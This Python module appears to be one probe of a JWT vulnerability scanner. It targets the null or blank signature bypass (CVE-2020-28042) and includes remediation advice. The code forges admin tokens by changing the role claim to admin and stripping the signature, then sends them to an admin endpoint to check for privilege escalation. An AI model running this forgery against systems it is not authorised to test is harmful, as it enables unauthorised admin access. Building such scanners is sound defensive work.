"""P5: null/blank signature bypass (CVE-2020-28042).

Takes alice's real login token, asserts `role: admin` in the payload, keeps the
ORIGINAL algorithm header (HS256 — unchanged), and removes the signature. Two
variants are sent:

    header.payload.     (empty signature string, trailing dot)
    header.payload      (no dot, no signature segment at all)

This is distinct from the alg:none probe: the `alg` header still says HS256, so
this catches libraries that branch on a *known* algorithm and then skip signature
verification when the signature is missing or blank.

CONFIRMED only if a variant returns HTTP 200 AND the escalation gate passes
(admin data / role a normal user provably could not reach). A server that
verifies the signature — even a deliberately-broken one that still rejects bad
signatures — rejects an absent signature, so the honest verdict there is
NOT_VULNERABLE.

This probe forges no valid signature, so it grants no ForgeCapability.
"""

from __future__ import annotations

from ..client import AuthClient, Baseline
from ..forge import tamper_claims
from ..models import Evidence, Finding, ForgeCapability, Severity, Target, Verdict
from .base import Probe, register


class NullSignatureProbe(Probe):
    id = "null_signature"
    title = "null/blank signature bypass (CVE-2020-28042)"
    severity = Severity.CRITICAL
    cwe = "CWE-347"
    cve = "CVE-2020-28042"
    remediation = (
        "Always verify the signature is present and non-empty before processing "
        "claims. A missing or blank signature must be rejected regardless of the "
        "alg header."
    )

    def run(
        self,
        client: AuthClient,
        target: Target,
        baseline: Baseline,
        capability: ForgeCapability,
    ) -> Finding:
        request_line = f"GET {target.admin_path}"

        # Assert admin in the payload but KEEP alice's original HS256 header; the
        # signature will then be stripped, not replaced.
        admin_token = tamper_claims(baseline.token, {"role": "admin"})
        header_b64, payload_b64, _ = (admin_token.split(".") + ["", "", ""])[:3]
        signing_input = f"{header_b64}.{payload_b64}"

        variants = {
            "blank signature (header.payload.)": f"{signing_input}.",
            "no signature (header.payload)": signing_input,
        }

        last: tuple[str, object] | None = None
        for label, forged in variants.items():
            resp = client.get(target.admin_path, forged)
            last = (forged, resp)
            if client.is_escalated(resp, baseline):
                evidence = Evidence(
                    forged_token=forged,
                    request_line=request_line,
                    status_code=resp.status_code,
                    response_snippet=resp.text[:200],
                    note=f"{label} accepted; escalated to admin",
                )
                return self._finding(Verdict.CONFIRMED, evidence)

        # Neither variant escalated: report the last attempt as evidence.
        forged, resp = last  # type: ignore[misc]
        evidence = Evidence(
            forged_token=forged,
            request_line=request_line,
            status_code=resp.status_code,  # type: ignore[union-attr]
            response_snippet=resp.text[:200],  # type: ignore[union-attr]
            note="blank and missing signatures both rejected (expected)",
        )
        return self._finding(Verdict.NOT_VULNERABLE, evidence)

    def _finding(self, verdict: Verdict, evidence: Evidence) -> Finding:
        return Finding(
            probe_id=self.id,
            title=self.title,
            verdict=verdict,
            severity=self.severity,
            cwe=self.cwe,
            evidence=evidence,
            remediation=self.remediation,
        )


register(NullSignatureProbe())
